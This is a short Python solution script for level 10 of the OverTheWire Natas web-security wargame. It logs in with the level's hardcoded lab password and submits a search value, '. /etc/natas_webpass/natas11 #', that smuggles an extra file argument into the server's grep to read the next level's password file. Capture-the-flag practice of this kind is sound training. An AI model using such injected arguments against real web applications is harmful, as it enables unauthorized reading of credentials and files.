#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
response = session.post(url, auth = (username, password), data = {"needle" : ". /etc/natas_webpass/natas11 #", "submit" : "submit"})
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('<pre>\n(.*)', content)[0])